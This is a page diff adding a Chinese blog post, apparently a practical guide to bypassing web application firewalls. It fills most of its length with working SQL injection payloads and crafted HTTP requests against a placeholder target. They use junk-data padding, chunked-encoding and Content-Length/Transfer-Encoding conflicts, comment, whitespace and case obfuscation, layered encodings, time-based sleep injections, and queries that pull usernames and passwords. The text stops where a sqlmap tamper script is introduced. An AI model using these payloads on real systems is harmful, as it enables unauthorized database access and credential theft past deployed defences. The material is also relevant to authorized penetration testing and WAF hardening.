@@ -1,0 +1,373 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>WAF 绕过技术实战指南 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="WAF 绕过核心思路Web 应用防火墙（WAF）的绕过本质是利用 WAF 与后端服务器在协议解析、资源处理、特性实现上的差异，构造 WAF 无法识别但后端可正常解析的恶意载荷。核心绕过思路可归纳为三个维度：  肝资源：通过超大数据包、垃圾数据填充等方式过载 WAF 检测引擎 肝协议：利用 HTTP 协议特性（分块传输、请求走私等）绕过检测 肝特性：针对 WAF 规则盲点进行 Fuzz，寻找未覆盖的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF 绕过技术实战指南">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/web1/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="WAF 绕过核心思路Web 应用防火墙（WAF）的绕过本质是利用 WAF 与后端服务器在协议解析、资源处理、特性实现上的差异，构造 WAF 无法识别但后端可正常解析的恶意载荷。核心绕过思路可归纳为三个维度：  肝资源：通过超大数据包、垃圾数据填充等方式过载 WAF 检测引擎 肝协议：利用 HTTP 协议特性（分块传输、请求走私等）绕过检测 肝特性：针对 WAF 规则盲点进行 Fuzz，寻找未覆盖的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-07.webp">
+<meta property="article:published_time" content="2026-02-13T08:04:29.732Z">
+<meta property="article:modified_time" content="2026-02-13T08:04:29.732Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-07.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "WAF 绕过技术实战指南",
+  "url": "https://www.52jl.top/2026/02/13/web1/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-07.webp",
+  "datePublished": "2026-02-13T08:04:29.732Z",
+  "dateModified": "2026-02-13T08:04:29.732Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/web1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WAF 绕过技术实战指南',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">WAF 绕过技术实战指南</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">WAF 绕过技术实战指南</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T08:04:29.732Z" title="发表于 2026-02-13 16:04:29">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T08:04:29.732Z" title="更新于 2026-02-13 16:04:29">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="WAF-绕过核心思路"><a href="#WAF-绕过核心思路" class="headerlink" title="WAF 绕过核心思路"></a>WAF 绕过核心思路</h1><p>Web 应用防火墙（WAF）的绕过本质是利用 WAF 与后端服务器在协议解析、资源处理、特性实现上的差异，构造 WAF 无法识别但后端可正常解析的恶意载荷。核心绕过思路可归纳为三个维度：</p>
+<ol>
+<li><strong>肝资源</strong>：通过超大数据包、垃圾数据填充等方式过载 WAF 检测引擎</li>
+<li><strong>肝协议</strong>：利用 HTTP 协议特性（分块传输、请求走私等）绕过检测</li>
+<li><strong>肝特性</strong>：针对 WAF 规则盲点进行 Fuzz，寻找未覆盖的攻击向量</li>
+</ol>
+<hr>
+<h1 id="SQL-注入-WAF-绕过"><a href="#SQL-注入-WAF-绕过" class="headerlink" title="SQL 注入 WAF 绕过"></a>SQL 注入 WAF 绕过</h1><h2 id="方法一：资源过载绕过"><a href="#方法一：资源过载绕过" class="headerlink" title="方法一：资源过载绕过"></a>方法一：资源过载绕过</h2><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>WAF 通常对请求包大小和检测时间有限制，通过构造超大数据包（如 10MB+）并在其中嵌入恶意载荷，可以：</p>
+<ul>
+<li>触发 WAF 的性能保护机制，导致部分内容不被检测</li>
+<li>利用 WAF 的采样检测策略（只检测前 N 字节）</li>
+<li>通过大量垃圾数据淹没特征匹配引擎</li>
+</ul>
+<h3 id="实战技巧"><a href="#实战技巧" class="headerlink" title="实战技巧"></a>实战技巧</h3><p><strong>1. 伪造大量无效参数</strong></p>
+<p>在正常参数前添加大量垃圾参数，将恶意载荷隐藏在数据包末尾：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/user/query</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10485760</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">fake1</span>=aaaaaaaaaa...（重复<span class="number">10</span>MB）&amp;fake2=bbbbbbbb...&amp;id=<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,database()--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/web1/1.webp" loading='lazy'></p>
+<p><strong>关键点</strong>：</p>
+<ul>
+<li>垃圾参数名应随机化，避免被 WAF 识别为攻击特征</li>
+<li>恶意载荷放在数据包末尾，确保后端服务器能解析到</li>
+<li>控制总包大小在服务器允许范围内（通常 10-50MB）</li>
+</ul>
+<p><strong>2. 超大 Cookie 填充</strong></p>
+<p>利用 Cookie 不受 WAF 严格检测的特点：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/user?id=1&#x27;</span> union <span class="string">select</span> 1,2,3-- <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> target.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=valid_token; padding=aaaaaaa...(5MB垃圾数据)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/web1/2.webp" loading='lazy'></p>
+<p><strong>优势</strong>：</p>
+<ul>
+<li>Cookie 通常不被 WAF 深度检测</li>
+<li>可以绕过只检测 POST Body 的 WAF</li>
+<li>结合 GET 参数注入，降低检测优先级</li>
+</ul>
+<hr>
+<h2 id="方法二：协议层绕过"><a href="#方法二：协议层绕过" class="headerlink" title="方法二：协议层绕过"></a>方法二：协议层绕过</h2><h3 id="HTTP-1-1-分块传输编码（Chunked-Transfer-Encoding）"><a href="#HTTP-1-1-分块传输编码（Chunked-Transfer-Encoding）" class="headerlink" title="HTTP&#x2F;1.1 分块传输编码（Chunked Transfer Encoding）"></a>HTTP&#x2F;1.1 分块传输编码（Chunked Transfer Encoding）</h3><p><strong>原理</strong>：WAF 可能不完整支持分块传输解码，导致无法正确拼接请求体，而后端服务器可以正常解析。</p>
+<p><strong>标准分块传输格式</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-makefile">5</span></span><br><span class="line"><span class="language-makefile">user=</span></span><br><span class="line"><span class="language-makefile">6</span></span><br><span class="line"><span class="language-makefile">admin&amp;</span></span><br><span class="line"><span class="language-makefile">8</span></span><br><span class="line"><span class="language-makefile">pass=123</span></span><br><span class="line"><span class="language-makefile">9</span></span><br><span class="line"><span class="language-makefile">&#x27; or 1=1<span class="comment">#</span></span></span><br><span class="line"><span class="language-makefile">0</span></span><br><span class="line"><span class="language-makefile"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/web1/3.webp" loading='lazy'></p>
+<p><strong>进阶技巧</strong>：</p>
+<p><strong>1. 混淆分块大小</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0005</span><br><span class="line">user=</span><br><span class="line">0x6</span><br><span class="line">admin&amp;</span><br><span class="line">010</span><br><span class="line">pass=123&#x27; or 1=1#</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 分块与 Content-Length 冲突</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">1e</span></span><br><span class="line"><span class="language-routeros"><span class="attribute">user</span>=admin&amp;pass=123&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1#</span></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br></pre></td></tr></table></figure>
+
+<p>部分 WAF 优先处理 Content-Length，而后端服务器优先处理 Transfer-Encoding。</p>
+<p><img src="/2026/02/13/web1/4.webp" loading='lazy'></p>
+<p><strong>3. 多重编码嵌套</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked, gzip</span><br><span class="line"></span><br><span class="line">1f</span><br><span class="line">user=admin&amp;pass=\x31\x32\x33&#x27; or 1=1#</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="方法三：SQL-语法特性-Fuzz"><a href="#方法三：SQL-语法特性-Fuzz" class="headerlink" title="方法三：SQL 语法特性 Fuzz"></a>方法三：SQL 语法特性 Fuzz</h2><h3 id="Fuzz-目标"><a href="#Fuzz-目标" class="headerlink" title="Fuzz 目标"></a>Fuzz 目标</h3><p>通过大量测试找到 WAF 规则未覆盖的 SQL 语法变种，常见 Fuzz 点包括：</p>
+<p><strong>1. 注释符变种</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 标准注释</span></span><br><span class="line"><span class="string">&#x27; or 1=1--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"><span class="string">&#x27; or 1=1/**/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 内联注释</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27;/**/or/**/1=1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- MySQL 特有注释</span></span><br><span class="line"><span class="string">&#x27;</span><span class="comment">/*!50000or*/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"><span class="string">&#x27;/*!12345union*//*!12345select*/1,2,3#</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 空白字符替换</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 标准空格</span></span><br><span class="line"><span class="string">&#x27; union select 1,2,3--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 替代空白符</span></span><br><span class="line"><span class="string">&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27;+union+select+1,2,3--</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>aselect<span class="operator">%</span><span class="number">0</span>a1,<span class="number">2</span>,<span class="number">3</span><span class="comment">--  (换行符)</span></span><br><span class="line"><span class="string">&#x27;%09union%09select%091,2,3--  (制表符)</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b1,<span class="number">2</span>,<span class="number">3</span><span class="comment">--  (垂直制表符)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 大小写混淆</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UnIoN SeLeCt 1,2,3--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">uNiOn</span> <span class="keyword">sElEcT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 编码绕过</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- URL 编码</span></span><br><span class="line"><span class="string">&#x27; %75%6e%69%6f%6e %73%65%6c%65%63%74 1,2,3--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 双重 URL 编码</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">%</span><span class="number">2575</span><span class="operator">%</span><span class="number">256</span>e<span class="operator">%</span><span class="number">2569</span><span class="operator">%</span><span class="number">256</span>f<span class="operator">%</span><span class="number">256</span>e <span class="operator">%</span><span class="number">2573</span><span class="operator">%</span><span class="number">2565</span><span class="operator">%</span><span class="number">256</span>c<span class="operator">%</span><span class="number">2565</span><span class="operator">%</span><span class="number">2563</span><span class="operator">%</span><span class="number">2574</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Unicode 编码</span></span><br><span class="line"><span class="string">&#x27; \u0075\u006e\u0069\u006f\u006e \u0073\u0065\u006c\u0065\u0063\u0074 1,2,3--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 十六进制编码（MySQL）</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">0x61646d696e</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 等价函数替换</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 字符串拼接</span></span><br><span class="line"><span class="string">&#x27; union select concat(&#x27;</span>ad<span class="string">&#x27;,&#x27;</span>min<span class="string">&#x27;),2,3--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;ad&#x27;</span><span class="operator">+</span><span class="string">&#x27;min&#x27;</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--  (MSSQL)</span></span><br><span class="line"><span class="string">&#x27; union select &#x27;</span>ad<span class="string">&#x27;||&#x27;</span>min<span class="string">&#x27;,2,3--  (Oracle/PostgreSQL)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 字符串截取</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">10</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; union select mid(database(),1,10),2,3--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 条件判断</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)<span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; and case when 1=1 then sleep(5) else 0 end--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/web1/5.webp" loading='lazy'></p>
+<p><strong>6. 数据库特性利用</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL 科学计数法</span></span><br><span class="line"><span class="string">&#x27; union select 1e0,2e0,3e0--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- MySQL 反引号</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> `username`,`password` <span class="keyword">from</span> `users`<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- MSSQL 方括号</span></span><br><span class="line"><span class="string">&#x27; union select [username],[password] from [users]--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- PostgreSQL 类型转换</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">cast</span>(version() <span class="keyword">as</span> text),<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Oracle 双引号</span></span><br><span class="line"><span class="string">&#x27; union select &quot;username&quot;,&quot;password&quot; from &quot;users&quot;--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="自动化-Fuzz-工具"><a href="#自动化-Fuzz-工具" class="headerlink" title="自动化 Fuzz 工具"></a>自动化 Fuzz 工具</h3><p><strong>推荐工具</strong>：</p>
+<ul>
+<li><strong>sqlmap</strong> + <code>--tamper</code> 脚本：内置多种绕过脚本</li>
+<li><strong>wfuzz</strong>：自定义 Payload 字典进行批量测试</li>
+<li><strong>Burp Intruder</strong>：结合自定义 Payload 列表</li>
+</ul>
+<p><strong>sqlmap tamper 脚本示例</strong>：</p>
